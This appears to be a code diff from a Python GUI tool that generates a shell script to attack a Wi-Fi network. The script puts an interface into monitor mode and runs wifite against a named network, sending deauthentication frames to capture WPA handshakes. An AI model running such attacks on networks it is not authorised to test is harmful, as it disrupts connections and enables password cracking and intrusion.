@@ -1108,14 +1108,20 @@ class MaximWindow(QMainWindow):
         script.write(f"rm -f '{signal_file}'\n")
         script.write(f"cd '{essid_dir}'\n\n")
 
+        # Set up monitor mode manually so we don't need --kill
+        # (--kill stops NetworkManager which drops wlan0 connection)
+        script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
+        script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
+        script.write(f"sudo ip link set {iface} up 2>/dev/null\n\n")
+
         # wifite flags:
-        #   -i wlan1        = use this interface
+        #   -i wlan1        = use this interface (already in monitor mode)
         #   --essid MAX     = target this specific network
-        #   --kill           = kill interfering processes (NetworkManager etc)
         #   --no-pmkid       = skip PMKID, go straight to handshake
-        #   --num-deauths 10 = send 10 deauth frames
+        #   --num-deauths 5  = fewer deauths to reduce disruption
         #   --wpa            = only attack WPA networks
-        script.write(f"sudo wifite -i {iface} --essid '{essid}' --kill --wpa --no-pmkid --num-deauths 10\n\n")
+        #   NO --kill        = keep NetworkManager alive (wlan0 stays connected)
+        script.write(f"sudo wifite -i {iface} --essid '{essid}' --wpa --no-pmkid --num-deauths 5\n\n")
 
         # If wifite exits, write signal so poller knows
         script.write(f"echo 'DONE' > '{signal_file}'\n")
